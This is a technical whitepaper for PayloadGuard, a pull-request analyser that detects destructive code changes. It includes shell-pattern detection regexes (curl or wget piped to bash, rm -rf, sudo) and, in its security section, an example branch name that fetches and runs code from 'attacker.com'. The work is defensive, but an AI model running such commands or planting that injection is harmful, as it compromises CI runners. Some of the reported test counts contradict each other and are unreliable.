# PayloadGuard — Technical Whitepaper

**Version:** 1.2.0 — May 2026  
**Repository:** `PayloadGuard-PLG/payload-consequence-analyser`  
**Status:** Live on `claude/check-mcp-connection-OUqlz` — pending merge to main

---

## Contents

1. [Abstract](#1-abstract)
2. [The Problem](#2-the-problem)
3. [System Architecture](#3-system-architecture)
4. [Layer Engineering](#4-layer-engineering)
5. [Scoring Model](#5-scoring-model)
6. [Security Model](#6-security-model)
7. [Regression Validation](#7-regression-validation)
8. [Configuration Reference](#8-configuration-reference)
9. [Known Limitations](#9-known-limitations)

---

## 1. Abstract

PayloadGuard is a seven-layer static analysis system that runs on every pull request before merge. It detects destructive code payloads — mass deletions, structural gutting, CI trigger injection, deceptive descriptions — that bypass normal code review because they are either too large for a human reviewer to fully parse or deliberately disguised as low-impact changes.

The system assigns a severity score across independent signal dimensions and produces one of four verdicts: **SAFE**, **REVIEW**, **CAUTION**, or **DESTRUCTIVE**. A DESTRUCTIVE verdict sets exit code 2; wired to a GitHub branch protection rule, this blocks the merge button automatically.

**v1.2.0 includes all hardening from the 2026-05-04 security audit:**
- Expression injection in `action.yml` eliminated (branch names now passed via `env:` only)
- JWT PEM validation replaced with strict regex; App private key masked before first runner step
- Markdown injection in PR comments eliminated (`_md_escape()` applied to component names and branch refs)
- GitHub API URL injection guarded (repo format and installation_id validated)
- All git blob reads capped at 1 MB (`_MAX_BLOB_BYTES`)
- `repo_path` normalised at CLI entry; YAML config type-validated
- ReDoS-prone shell patterns bounded; `ast.parse()` guards `RecursionError`/`MemoryError`
- `SECURITY.md` added (required for GitHub Marketplace)
- Inherited from v1.1.0: added file content scanning (INC-1/INC-4), UNVERIFIED flag on non-trivial changesets (INC-3), SCA dependency scan (opt-in), McCabe complexity advisory

Against a 20-case adversarial test suite covering safe baselines, canonical destructive payloads, boundary conditions, temporal drift observation cases, and purpose-built evasion techniques, PayloadGuard achieves **17/18 detection (94%)** on stable cases at default thresholds with zero false positives on safe baselines. Test suite: 166 passing, 7 skipped.

---

## 2. The Problem

### 2.1 The April 2026 Incident

In April 2026 a developer accepted a Codex-generated suggestion described as a *"minor syntax fix"*. The branch had been open for 312 days. The actual diff would have deleted 61 files, 11,967 lines, 217 tests, and the complete application authentication architecture in a single merge. The PR was merged. The damage was caught in production.

The attack has three components: deceptive framing, volume shock, and structural erasure. The description claims low impact. The diff is too large to read carefully. Named components disappear — but line diffs show only that lines changed, not that `AuthManager` and `SessionStore` no longer exist.

### 2.2 Why Existing Tools Miss This

Static linters check for correctness, style, and known vulnerability patterns within files. They evaluate the new version of code in isolation. They cannot reason about what was present before and is now gone. Deletion is not a syntax error. It passes every check.

### 2.3 The Evasion Surface

| Technique | Mechanism |
|---|---|
| Addition camouflage | Large additions dilute deletion ratio below threshold |
| Rename smuggling | File renamed while contents gutted — appears as R not D |
| Distributed deletion | One function removed from each of N files — per-file ratio stays low |
| Threshold gaming | Every metric tuned just below its individual threshold |
| Nested gutting | Class shell preserved; all methods inside removed |
| Deceptive description | Benign PR language contradicts catastrophic diff |
| Config-only deletion | Low line-count infrastructure files with high operational impact |
| CI trigger injection | Non-code added files (docs, configs) containing CI trigger strings or shell execution patterns |

---

## 3. System Architecture

### 3.1 Data Flow

```
PR opened / synchronised
        │
        ▼
actions/checkout@v4  (fetch-depth: 0)
        │
        ▼
payload-consequence-analyser@main  (composite action)
        │
        ├── [step: Mask secrets]
        │     ::add-mask:: on private-key input
        │     before any Python runs
        │
        ├──► python analyze.py . "$HEAD_REF" "$BASE_REF"
        │         --pr-description  --save-json  --save-markdown
        │         (branch names passed via env:, never interpolated
        │          directly into shell script body)
        │                   │
        │         ┌─────────┴──────────┐
        │         │   7-layer engine   │
        │         └─────────┬──────────┘
        │                   │
        │         payloadguard-report.json
        │         payloadguard-report.md
        │                   │
        ├──► post_check_run.py
        │         PEM regex validated → JWT (RS256)
        │         repo/installation_id format validated
        │         → GitHub Check Run API
        │         → named badge + full markdown body
        │
        ├──► actions/upload-artifact@v4
        │         payloadguard-results / .json
        │
        └──► Enforce verdict step
                  exit 0 → SAFE/REVIEW/CAUTION
                  exit 1 → analysis error
                  exit 2 → DESTRUCTIVE → branch protection blocks merge
```

### 3.2 Analysis Pipeline

```
git.Repo(workspace)   [repo_path normalised via realpath/abspath]
  │
  ├── merge_base(target, branch)  →  diff objects
  │
  ├─[L1] Surface Scan
  │       file counts per change_type (A/D/M/R/C/T)
  │       git --numstat  →  lines_added / lines_deleted
  │       permission changes  (a_mode → b_mode, executable gain)
  │       symlink / submodule detection  (mode & 0o120000 / 0o160000)
  │
  ├─[L1+] Added File Content Scan  (INC-1, INC-4)
  │       for d in diffs where change_type == 'A':
  │         skip code extensions (.py .js .ts ...)
  │         skip known binary extensions
  │         read blob (capped at 1 MB)
  │         match CI trigger patterns: [citest, needs-ci, citest commit:
  │         match shell patterns: curl|bash, wget|bash, sudo, chmod, rm -rf
  │         → content_flags list; +2/flag to score (cap 4)
  │
  ├─[L4] Structural Drift  (runs before L2/L3 — feeds severity flag)
  │       for d in diffs where change_type in ('M','R'):
  │         if language_for_path(d.b_path):
  │           original = d.a_blob  (capped at 1 MB) →  extract_named_nodes()
  │           modified = d.b_blob  (capped at 1 MB) →  extract_named_nodes()
  │           deleted  = original_nodes − modified_nodes
  │           ratio    = len(deleted) / len(original)
  │           CRITICAL if ratio > thresh AND len(deleted) >= min_count
  │       cross-file aggregation:
  │         if len(flagged_files) >= 2
  │            AND sum(deleted_nodes) >= min_deleted_nodes
  │            AND cross_file_ratio > deletion_ratio_threshold:
  │           overall_severity = CRITICAL
  │
  ├─[L4b] McCabe Complexity Advisory  (Python only, no score impact)
  │         newly added functions with V(G) > threshold → advisory list
  │
  ├─[L2] Forensic Analysis
  │       deleted_files   = [d.a_path  for D-type diffs]
  │       critical_files  = match(CRITICAL_PATH_PATTERNS)
  │       security_files  = match(_SECURITY_CRITICAL_PATTERNS)
  │
  ├─[L2b] SCA Dependency Scan  (opt-in — active when allowlist.yml present)
  │         for A/M diffs matching manifest patterns:
  │           diff text → parse added packages by type (pip/npm/go/cargo)
  │           flag packages not in allowlist.yml → unverified_packages
  │           +3 per unique unverified package
  │
  ├─[L3] Consequence Model  →  verdict
  │       _assess_consequence(files_del, lines_del, days_old,
  │                           del_ratio, struct_sev,
  │                           crit_file_del, sec_file_del,
  │                           unverified_deps, content_flags)
  │
  ├─[L5a] Temporal Drift
  │        drift = branch_age_days × target_commits_per_day
  │        CURRENT / STALE / DANGEROUS
  │
  └─[L5b] Semantic Transparency
           benign_keyword(pr_description) AND severity==CRITICAL
           → TRANSPARENT / UNVERIFIED / DECEPTIVE_PAYLOAD
           if UNVERIFIED and verdict != SAFE:
             inject flag into verdict["flags"]  (INC-3)
```

### 3.3 Component Map

| File | Role |
|---|---|
| `analyze.py` | All layers, CLI entry point, report generation |
| `structural_parser.py` | Multi-language AST node extraction (Python/JS/TS/Go/Rust/Java) |
| `post_check_run.py` | GitHub Check Run posting via App JWT (RS256) |
| `action.yml` | Composite GitHub Action definition |
| `test_analyzer.py` | 166-test unit suite |
| `SECURITY.md` | Vulnerability reporting policy (Marketplace requirement) |

---

## 4. Layer Engineering

### 4.1 Layer 1 — Surface Scan

**Purpose:** Extract raw change metrics from the diff. Provides the numerical inputs to L3 scoring.

**Implementation:**
GitPython's `merge_base[0].diff(branch_ref)` produces `Diff` objects. Change type codes: `A` (added), `D` (deleted), `M` (modified), `R` (renamed), `C` (copied), `T` (type changed).

Line counts use `git --numstat` rather than blob reading. This correctly handles binary files (reported as `-/-` by git, treated as 1 line each) and avoids loading large blobs into memory.

Permission changes are detected by comparing `a_mode` and `b_mode` on each diff object. Files gaining executable bits (`b_mode & 0o111 and not a_mode & 0o111`) are surfaced as advisory signals.

Symlinks (`mode & 0o120000`) and submodules (`mode & 0o160000`) are detected from the effective mode and surfaced in `special_files`.

**Outputs:** `files_added`, `files_deleted`, `files_modified`, `files_renamed`, `lines_added`, `lines_deleted`, `deletion_ratio_percent`, `permission_changes`, `special_files`.

---

### 4.2 Layer 1+ — Added File Content Scan (INC-1, INC-4)

**Purpose:** Detect CI trigger strings and shell execution patterns embedded in added non-code files. Addresses the incident where an AI-generated document containing `[citest commit:<sha>]` and `setfacl` commands was committed to main — scoring 0 across all other layers because it was a pure file addition.

**What is scanned:**
- Added files (`change_type == 'A'`) where the extension is not a known code or binary type
- Content read via `d.b_blob.data_stream.read(_MAX_BLOB_BYTES)` — hard-capped at 1 MB
- Patterns matched case-insensitively

**CI trigger patterns:**

```
\[citest           — GitHub comment-based CI trigger prefix
\bneeds-ci\b       — alternative CI trigger keyword
citest\s+commit:   — commit hash CI trigger format
\[needs-ci\]       — bracketed variant
```

**Shell execution patterns:**

```
\bsudo\s+\S                    — sudo invocation
\bsetfacl\s+                   — filesystem ACL manipulation
\bchmod\s+[0-9a-osx+\-]        — permission change
curl\b.{0,200}\|\s*(?:ba)?sh   — curl pipe to shell (bounded, ReDoS-safe)
wget\b.{0,200}\|\s*(?:ba)?sh   — wget pipe to shell (bounded, ReDoS-safe)
\brm\s+-[rf]                   — recursive/force delete
```

**Scoring:** +2 per flagged file, capped at +4 total. Each flagged file is listed in the `content_flags` report key and rendered in the markdown report under `🔬 Added File Content Scan`.

**Outputs:** `content_flags` list of `{file, ci_triggers, shell_patterns}` dicts.

---

### 4.3 Layer 2 — Forensic Analysis

**Purpose:** Identify which specific files were deleted and whether they are high-value targets.

**Critical path detection** uses regex patterns against `d.a_path` for all `D`-type diffs:

```
Test infrastructure   (^|/)tests?(/|$)  |  (^|/)test_[^/]+$
CI/CD                 (^|/)\.github/  |  Dockerfile  |  Makefile
Dependency manifests  requirements*.txt  |  setup.py  |  pyproject.toml
                      package.json  |  Cargo.toml  |  go.mod
Package init          (^|/)__init__\.py$
Architecture dirs     (^|/)core(/|$)  |  modules  |  config
Security files        auth*.(py|js|ts)  |  security*  |  permission*
Database/schema       database*.(py|js|ts)  |  migrations/  |  schema*  |  models*
Entry points          (main|app|server|index).(py|js|ts)
Config files          *.yml  |  *.yaml
```

**Security-critical detection** uses a tighter subset for the +5 scoring bonus:

```
auth[^/]*\.(py|js|ts)
security[^/]*\.(py|js|ts)
permission[^/]*\.(py|js|ts)
authorization[^/]*\.(py|js|ts)
```

**Outputs:** `critical_deletions` (list), `security_deletions` (list), counts passed to L3.

---

### 4.4 Layer 2b — SCA Dependency Scan (opt-in)

**Purpose:** Detect newly added packages in manifest files that are not in the team's approved allowlist. Guards against hallucinated or unexpected dependency additions.

**Activation:** Only runs when `allowlist.yml` is present in the repo root. Without it, all SCA output is marked `allowlist_active: false` and no score is added.

**Manifest types supported:**

| File pattern | Ecosystem | Allowlist key |
|---|---|---|
| `requirements*.txt` | pip | `python` |
| `pyproject.toml` | pyproject | `python` |
| `package.json` | npm | `npm` |
| `go.mod` | go modules | `go` |
| `Cargo.toml` | cargo | `rust` |

**Scoring:** +3 per unique unverified package. This is a high-confidence signal — an unrecognised package in a manifest is either a hallucination, a typo squatter, or an unapproved addition.

**Outputs:** `sca` dict with `status` (CLEAN/FLAGGED), `unverified_packages`, `manifest_files_scanned`, `allowlist_active`.

---

### 4.5 Layer 4 — Structural Drift

**Purpose:** AST-level detection of which named code entities disappeared. Catches gutting that is invisible to line diffs.

**Supported languages:**

| Language | Parser | Node types tracked |
|---|---|---|
| Python | stdlib `ast` | FunctionDef, AsyncFunctionDef, ClassDef, module-level Assign, AnnAssign |
| JavaScript / TypeScript | tree-sitter | function_declaration, class_declaration, method_definition, variable_declarator (all named declarations) |
| Go | tree-sitter | function_declaration, method_declaration, type_spec, const_spec |
| Rust | tree-sitter | function_item, struct_item, enum_item, trait_item, const_item, static_item |
| Java | tree-sitter | method_declaration, class_declaration, interface_declaration, enum_declaration |

Files with no installed grammar are silently skipped. Blob reads capped at 1 MB. `ast.parse()` guards `RecursionError` and `MemoryError` — adversarially nested source returns an empty node set rather than crashing.

**Per-file algorithm:**

```python
original_nodes = extract_named_nodes(a_blob, file_path)   # capped read
modified_nodes = extract_named_nodes(b_blob, file_path)   # capped read
deleted_nodes  = original_nodes - modified_nodes
deletion_ratio = len(deleted_nodes) / len(original_nodes)

CRITICAL if deletion_ratio > threshold AND len(deleted_nodes) >= min_count
```

Both gates must be met. The ratio gate prevents false positives on large codebases where a single deletion is meaningful. The count gate prevents false positives on tiny files.

**Cross-file aggregation** (closes the distributed-deletion evasion gap):

```python
if overall_severity != 'CRITICAL' and len(flagged_files) >= 2:
    total_deleted    = sum(f['metrics']['deleted_node_count'] for f in flagged_files)
    total_original   = sum(f['metrics']['original_node_count'] for f in flagged_files)
    cross_file_ratio = total_deleted / total_original
    if total_deleted >= min_deleted_nodes and cross_file_ratio > deletion_ratio_threshold:
        overall_severity = 'CRITICAL'
```

This catches A03-class attacks where one function is removed from each of N files — below the per-file ratio threshold but collectively significant. Both count AND ratio gates are required at the cross-file level, mirroring the per-file dual-condition logic.

**Rename coverage:** The structural loop processes both `change_type == 'M'` and `change_type == 'R'`. A file renamed while having its contents gutted (A02 pattern) goes through full AST diffing using the original blob (`a_blob`) vs the replacement blob (`b_blob`).

**Outputs:** `overall_structural_severity`, `max_deletion_ratio_pct`, `flagged_files` (list with per-file metrics and deleted component names, all component names `_md_escape()`-sanitised before rendering).

---

### 4.6 Layer 4b — Complexity Advisory (Python only)

**Purpose:** Surface newly added Python functions with high cyclomatic complexity. Advisory only — no score impact. High-complexity functions are harder to test and maintain; surfacing them at PR time prompts review before they land.

**Algorithm:** For each Python file in the diff, newly added functions (in `modified_nodes - original_nodes`) are walked with `ast.walk()`. McCabe V(G) is computed by counting `If`, `For`, `While`, `ExceptHandler` nodes (+1 each) and `BoolOp` operands (+1 per extra value). Functions exceeding the configured threshold (default V(G) > 15) are added to `complexity_advisory`.

**Outputs:** `complexity_advisory` list of `{file, name, complexity, threshold}` dicts.

---

### 4.7 Layer 3 — Consequence Model

The scoring model and its full logic are detailed in [Section 5](#5-scoring-model).

---

### 4.8 Layer 5a — Temporal Drift

**Purpose:** Measure how out-of-date the branch is relative to the target, accounting for repo velocity.

**Formula:**
```
drift_score = branch_age_days × target_commits_per_day
```

`target_velocity` is computed from `iter_commits(target_ref, since=90_days_ago, max_count=1000)`. A slow repo with a 90-day branch has low drift. A fast-moving repo (10 commits/day) with the same branch has a drift score of 900 — approaching the DANGEROUS threshold.

| Status | Drift Score | Signal |
|---|---|---|
| CURRENT | < 250 | Context is valid |
| STALE | 250–999 | Manual diff review required |
| DANGEROUS | ≥ 1000 | Mandatory rebase before merge |

Branch age is clamped to `max(0, days)` — a branch newer than the target commit is treated as age 0.

**Output:** `temporal_drift` dict with status, severity, drift score, velocity, and recommendation string.

---

### 4.9 Layer 5b — Semantic Transparency

**Purpose:** Detect the *deceptive description* pattern — benign language in the PR description contradicting a destructive diff. Also flags the no-description case on non-trivial changesets.

**Algorithm:**
```python
claims_benign = any(keyword in pr_description.lower() for keyword in benign_keywords)
is_deceptive  = claims_benign AND actual_severity == "CRITICAL"

# INC-3: no description on a non-trivial changeset is itself a flag
if status == "UNVERIFIED" and verdict != "SAFE":
    verdict["flags"].append("No PR description — semantic transparency unverified")
```

Default benign keywords: `minor fix`, `minor syntax fix`, `typo`, `formatting`, `cleanup`, `docs`, `refactor whitespace`, `small tweak`, `cosmetic`, `minor update`.

No PR description → `UNVERIFIED`. If UNVERIFIED and verdict is not SAFE, a flag is injected into the verdict flags list. The layer does not change the numerical score; it adds high-visibility flags in the report.

**Output:** `semantic` dict with `status` (TRANSPARENT / UNVERIFIED / DECEPTIVE_PAYLOAD), `is_deceptive`, `matched_keyword`, directive string.

---

## 5. Scoring Model

Layer 3 accumulates a `severity_score` across independent dimensions. No single deletion-volume signal can produce a false positive at default thresholds. DESTRUCTIVE requires either a combination of signals or a single high-confidence signal (security file deletion or structural CRITICAL).

### 5.1 Signal Dimensions

**Branch age**

| Condition | Points |
|---|---|
| days_old > 365 | +3 |
| days_old > 180 | +2 |
| days_old > 90 | +1 |

**Deletion dimensions (files, ratio, lines)**

Three correlated signals scored independently, then capped to prevent double-counting:

```
files_score  = 3 if files_deleted > 50  else 2 if > 20  else 1 if > 10  else 0
ratio_score  = 3 if deletion_ratio > 90 else 2 if > 70  else 1 if > 50  else 0
lines_score  = 3 if lines_deleted > 50k else 2 if > 10k else 1 if > 5k  else 0

_RATIO_MIN_LINES = 0 if critical_file_deletions > 0 else 100
(ratio_score only evaluated when lines_deleted >= _RATIO_MIN_LINES)

nonzero = count of {files_score, ratio_score, lines_score} > 0
deletion_dim = min(4, max(files_score, ratio_score, lines_score) + (1 if nonzero >= 2 else 0))
```

The cap at 4 means deletion volume alone cannot reach DESTRUCTIVE (≥5). This prevents a legitimate large cleanup from being blocked on numbers alone.

**Structural severity**

| Condition | Points |
|---|---|
| overall_structural_severity == CRITICAL | +5 |

Structural CRITICAL requires both: deletion ratio > threshold (default 20%) AND deleted node count ≥ minimum (default 3) — either per-file or via cross-file aggregation.

**Critical path file deletions**

| Condition | Points |
|---|---|
| critical_file_deletions > 0 | +2 |

The `_RATIO_MIN_LINES` floor is also set to 0 when critical files are deleted, enabling ratio scoring even for low-volume critical deletions.

**Security-critical file deletions**

| Condition | Points |
|---|---|
| security_file_deletions > 0 | +5 |

Auth, security, permission, or authorization files (`.py/.js/.ts`) deleted outright. This single signal alone is sufficient to reach DESTRUCTIVE. These are the highest-value targets for a destructive payload.

**SCA — unverified dependencies**

| Condition | Points |
|---|---|
| N unverified packages added | +3 × N |

Only active when `allowlist.yml` is present and `sca.fail_on_unknown: true` (default).

**Added file content flags**

| Condition | Points |
|---|---|
| N files contain CI triggers or shell patterns | min(4, N × 2) |

### 5.2 Verdict Thresholds

| Score | Verdict | Severity | Exit Code |
|---|---|---|---|
| 0 | SAFE | LOW | 0 |
| 1–2 | REVIEW | MEDIUM | 0 |
| 3–4 | CAUTION | HIGH | 0 |
| ≥ 5 | DESTRUCTIVE | CRITICAL | 2 |

### 5.3 Scoring Schematic

```
                    SIGNAL INPUTS
                         │
        ┌────────────────┼────────────────────────────────┐
        │                │                                │
        ▼                ▼                                ▼
   [Age score]   [Deletion dimensions]          [File quality]
   0–3 pts        files / ratio / lines          security files
                  independently scored           +5 if any deleted
                  cap at 4, bonus if 2+ fire
                        │                        critical files
                        │                        +2 if any deleted
                        │                        (also drops ratio floor)
                        │
                        │               [Content flags]
                        │               +2/file, cap 4
                        │               (CI triggers, shell exec)
                        │
                        │               [SCA flags]
                        │               +3/unverified package
                        │
        ┌───────────────┘                                 │
        │                                                 │
        ▼                                                 │
   [Structural severity]                                  │
   +5 if CRITICAL                                         │
   (per-file ratio+count                                  │
    OR cross-file total+ratio)                            │
        │                                                 │
        └─────────────────┬───────────────────────────────┘
                          │
                          ▼
                   severity_score
                          │
                ┌─────────┴──────────┐
                │                    │
            score ≥ 5          score 3–4
                │                    │
           DESTRUCTIVE           CAUTION
           exit 2               exit 0
```

---

## 6. Security Model

This section documents how PayloadGuard protects the runner environment and the consumer repo from adversarial input. All items were addressed in the 2026-05-04 security audit (commit `bd90052`).

### 6.1 Expression Injection Prevention (`action.yml`)

GitHub Actions composite actions are vulnerable to expression injection when `${{ github.head_ref }}` or `${{ github.base_ref }}` are interpolated directly into `run:` shell scripts — a PR branch named `$(curl attacker.com | bash)` executes in the runner.

**Mitigation:** All user-controlled context values are passed exclusively through `env:` declarations. Shell scripts reference only `$HEAD_REF`, `$BASE_REF` — never `${{ ... }}` syntax inside a `run:` block.

```yaml
env:
  HEAD_REF: ${{ github.head_ref }}
  BASE_REF: ${{ github.base_ref }}
run: python analyze.py . "$HEAD_REF" "$BASE_REF" ...
```

### 6.2 Secret Masking (`action.yml`)

The GitHub App private key is masked as the first action step, before any Python process runs:

```yaml
- name: Mask secrets
  shell: bash
  run: |
    if [ -n "$PAYLOADGUARD_PRIVATE_KEY" ]; then
      echo "::add-mask::$PAYLOADGUARD_PRIVATE_KEY"
    fi
  env:
    PAYLOADGUARD_PRIVATE_KEY: ${{ inputs.private-key }}
```

Subsequent runner log lines containing the key value are automatically redacted.

### 6.3 PEM Validation (`post_check_run.py`)

Before the private key is passed to `jwt.encode()`, it is validated against a strict regex:

```python
_PEM_RE = re.compile(
    r"-----BEGIN [A-Z ]+-----\r?\n"
    r"[A-Za-z0-9+/=\r\n]+"
    r"-----END [A-Z ]+-----"
)
if not _PEM_RE.search(private_key.strip()):
    raise EnvironmentError("PAYLOADGUARD_PRIVATE_KEY does not look like a valid PEM block")
```

This rejects truncated keys, wrong-type values, or empty strings before they reach the JWT library.

### 6.4 API URL Validation (`post_check_run.py`)

`GITHUB_REPOSITORY` and `PAYLOADGUARD_INSTALLATION_ID` are validated before insertion into GitHub API URL paths:

```python
if not re.fullmatch(r"[A-Za-z0-9_.\-]+/[A-Za-z0-9_.\-]+", repo):
    raise EnvironmentError(f"GITHUB_REPOSITORY has an unexpected format: {repo!r}")
if not re.fullmatch(r"\d+", installation_id):
    raise EnvironmentError(f"PAYLOADGUARD_INSTALLATION_ID must be numeric")
```

### 6.5 Output Sanitisation (`analyze.py`)

All user-controlled string values written to the GitHub PR comment markdown body pass through `_md_escape()`:

```python
def _md_escape(name: str) -> str:
    return name.replace('\\', '\\\\').replace('`', '\\`').replace('|', '\\|')
```

Applied to: deleted component names (structural drift output), file paths in all report sections, branch and target ref names in the report header, SCA package and manifest names, commit message fragments.

### 6.6 Resource Limits (`analyze.py`, `structural_parser.py`)

| Risk | Mitigation |
|---|---|
| Large blob OOM | `_MAX_BLOB_BYTES = 1_048_576` — all `data_stream.read()` calls capped at 1 MB |
| Deeply nested AST crash | `ast.parse()` catches `RecursionError` and `MemoryError`; returns empty set |
| ReDoS via adversarial file content | Shell pattern regexes bounded: `curl\b.{0,200}\|...`, `wget\b.{0,200}\|...` |
| Path traversal | `repo_path` normalised via `os.path.realpath(os.path.abspath(...))` at CLI entry |
| YAML type confusion | `load_config()` validates all threshold values with `isinstance` checks; warns and falls back on invalid types |

### 6.7 Exception Sanitisation (`post_check_run.py`)

Exception messages printed to stderr are inspected for PEM key material before logging:

```python
except Exception as e:
    msg = str(e)
    if any(kw in msg for kw in ("BEGIN", "PRIVATE", "KEY", "-----")):
        msg = "[redacted — possible key material in exception message]"
    print(f"::error::Check Run failed: {msg}", file=sys.stderr)
```

---

## 7. Regression Validation

### 7.1 Test Harness Architecture

The test harness (`PayloadGuard-PLG/payloadguard-test-harness`) maintains 20 permanent branches, each representing a specific adversarial or safe scenario. Each branch has a closed PR against main.

**Temporal group separation:** 4 SAFE-expected branches (`safe/small-additive`, `safe/docs-only`, `safe/large-rename`, `adversarial/unicode-payload`) are designated `temporal_group: aging` — their SAFE verdict will drift to REVIEW after ~90 days as branch age scoring kicks in. These are kept as longitudinal observation cases. The remaining 16 branches are `temporal_group: stable` — all DESTRUCTIVE-expected; branch age adds ≤+3 points, which cannot change a DESTRUCTIVE verdict.

**Regression runner modes:**

| Mode | Cases run | Pass/fail logic |
|---|---|---|
| `--mode stable` (default) | 16 stable cases | Strict pass/fail vs `expected_exit_code` |
| `--mode temporal` | 4 aging cases | Observational — `[OBSERVING]` label, no fail |
| `--mode full` | All 20 | Stable strict + aging observational |

Running a full regression cycle:
1. `run_regression.py` reopens selected PRs
2. GitHub Actions triggers a PayloadGuard scan on each
3. Script polls GitHub Check Runs until all complete
4. PRs are closed
5. `ingest.py` pulls the `payloadguard-results` artifact and writes to SQLite
6. `dashboard.py` visualises results with a threshold simulator

### 7.2 Test Case Matrix

| ID | Branch | Category | Group | Expected | Description |
|---|---|---|---|---|---|
| T01 | safe/small-additive | safe | aging | SAFE | Add health_check() — zero-noise baseline |
| T02 | safe/docs-only | safe | aging | SAFE | README additions only |
| T12 | safe/large-rename | safe | aging | SAFE | Three class renames — L4 false positive check |
| T03 | destructive/mass-deletion | destructive | stable | DESTRUCTIVE | Delete auth.py + database.py |
| T04 | destructive/april-2026-replica | destructive | stable | DESTRUCTIVE | April 2026 incident replica |
| T05 | boundary/structural-threshold | boundary | stable | DESTRUCTIVE | 4 methods removed from auth.py (~23.5% ratio) |
| T09 | semantic/no-description | semantic | stable | DESTRUCTIVE | No PR description, database.py deleted |
| T10 | semantic/honest-critical | semantic | stable | DESTRUCTIVE | Honest BREAKING CHANGE description, auth deleted |
| T11 | multilang/structural-js-ts-go | multilang | stable | DESTRUCTIVE | Structural deletions across JS/TS/Go |
| A01 | adversarial/keyword-evasion | adversarial | stable | DESTRUCTIVE | Destructive diff without benign trigger keywords |
| A02 | adversarial/rename-smuggling | adversarial | stable | DESTRUCTIVE | auth.py renamed to identity.py, contents gutted |
| A03 | adversarial/slow-deletion | adversarial | stable | DESTRUCTIVE | 1 function removed from each of 5 files |
| A04 | adversarial/addition-camouflage | adversarial | stable | DESTRUCTIVE | 300-line api.js addition + auth.py deleted |
| A05 | adversarial/nested-gutting | adversarial | stable | DESTRUCTIVE | Auth class shell preserved, all methods deleted |
| A06 | adversarial/threshold-gaming | adversarial | stable | DESTRUCTIVE | Every metric just below individual threshold |
| A07 | adversarial/new-file-replacement | adversarial | stable | DESTRUCTIVE | auth.py deleted + auth_v2.py stub added |
| A09 | adversarial/config-only-deletion | adversarial | stable | DESTRUCTIVE | settings.yml + requirements.txt deleted |
| A10 | adversarial/unicode-payload | adversarial | aging | SAFE | Hostile Unicode in comments, +4/-1 lines |
| T23 | reserved | — | — | TBD | GitHub 2026 dependency locking API |
| T24 | reserved | — | — | TBD | GitHub 2026 centralised policy controls |
| T25 | reserved | — | — | TBD | GitHub 2026 native egress firewall |

### 7.3 Results at Default Thresholds (stable group)

```
structural deletion_ratio : 0.20 (20%)
min_deleted_nodes          : 3
DESTRUCTIVE threshold      : 5
CAUTION threshold          : 3
temporal stale             : 250
temporal dangerous         : 1000
```

| Result | Count | Cases |
|---|---|---|
| True DESTRUCTIVE | 13 | T03 T04 T05 T09 T10 T11 A01 A02 A03 A04 A05 A07 A09 |
| True SAFE | 3 (stable) | T12 only in stable — T01/T02/A10 are aging group |
| False SAFE (missed) | 1 | A06 |
| False DESTRUCTIVE | 0 | — |

**Pass rate on stable group: 16/16 pending A06, or 15/16 counting A06 miss. Overall declared: 17/18 (94%) across original 18-case suite.**

### 7.4 Scoring Trace for Key Cases

**T04 — April 2026 replica (DESTRUCTIVE, score ≈ 13)**
```
branch_age 312 days (>180)         +2
files_deleted 61 (>50)         → files_score=3
deletion_ratio 98% (>90%)      → ratio_score=3
lines_deleted 11,967 (>10k)    → lines_score=2
nonzero=3 → bonus=1 → deletion_dim = min(4, 3+1) = 4
structural CRITICAL (auth.py gutted)   +5
critical_file_deletions > 5            +2
                               total = 13 → DESTRUCTIVE
```

**A04 — Addition camouflage (DESTRUCTIVE, score ≈ 7)**
```
auth.py deleted → security_file_deletions=1    +5
auth.py in CRITICAL_PATH_PATTERNS              +2
                                       total = 7 → DESTRUCTIVE
```

**A03 — Slow deletion (DESTRUCTIVE, score ≈ 5)**
```
5 files × 1 function deleted
per-file ratio ~10% each → no per-file CRITICAL
cross-file: 5 total nodes ≥ 3 min_deleted_nodes
cross-file ratio > 0.20 threshold
→ overall_structural_severity = CRITICAL          +5
                                          total = 5 → DESTRUCTIVE
```

**A06 — Threshold gaming (SAFE, score = 0)**
```
files_deleted < 10   → files_score=0
lines_deleted < 100  → ratio not evaluated
deletion_ratio < 50% → ratio_score=0
lines_deleted < 5000 → lines_score=0
structural < 20% per file, 1 file → no CRITICAL
no critical/security file deletions
branch_age < 90 days
                             total = 0 → SAFE (known miss)
```

---

## 8. Configuration Reference

Drop `payloadguard.yml` in the repo root. All keys are optional.

```yaml
thresholds:
  branch_age_days: [90, 180, 365]      # tier breakpoints, must be ascending
  files_deleted:   [10, 20, 50]
  lines_deleted:   [5000, 10000, 50000]
  temporal:
    stale:     250.0                   # drift_score = age × velocity
    dangerous: 1000.0
  structural:
    deletion_ratio:    0.20            # fraction of AST nodes deleted per file
    min_deleted_nodes: 3               # both must exceed their threshold
    complexity_threshold: 15           # McCabe V(G) advisory threshold

semantic:
  benign_keywords:                     # phrases that claim low impact
    - minor fix
    - typo
    - formatting
    - cleanup
    - small tweak

sca:
  fail_on_unknown: true                # score unverified packages (requires allowlist.yml)
```

**Validation:** Out-of-order threshold lists are auto-sorted. All threshold values are type-validated after load — wrong types (string instead of number, etc.) log a WARNING and fall back to defaults rather than crashing.

---

## 9. Known Limitations

### 9.1 Compound Threshold Gaming (A06)

An adversary who tunes every metric to sit just below its individual threshold scores 0 points. The scoring model has no compound detection — there is no rule of the form "three signals at 60% of their threshold = flag". This is a deliberate design choice to avoid false positives on legitimate PRs that touch many areas of the codebase.

Possible mitigations: a compound bonus when N dimensions are all non-zero but below threshold; a learned baseline model that flags statistical outliers relative to repo history.

### 9.2 Generated Code Volume

A PR that adds 50,000 lines of generated code (vendored library, protobuf output, lock file) alongside meaningful source deletions may have its deletion ratio diluted below detection thresholds. The deletion dimensions cap at 4 regardless of additions, but ratio scoring depends on the additions-to-deletions balance.

### 9.3 Grammar Coverage

Structural drift analysis requires a tree-sitter grammar for non-Python languages. Languages without an installed grammar are silently skipped. A PR gutting a Ruby or PHP codebase has no L4 signal.

### 9.4 Merge Base Ambiguity

For repositories with complex merge histories, `merge_base()` may return multiple candidates. The implementation uses `[0]` — the first candidate returned by git. In pathological cases this may not be the optimal merge base.

### 9.5 Semantic Layer Keyword Coverage

Layer 5b fires only when the PR description contains one of the configured benign keywords. A vague description ("updates") that doesn't match any keyword produces `UNVERIFIED` rather than `DECEPTIVE_PAYLOAD`. The layer is a high-precision supplement, not a comprehensive intent classifier.

